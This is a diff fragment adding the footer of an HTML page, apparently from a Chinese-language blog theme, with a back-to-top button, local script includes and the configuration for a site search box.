+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
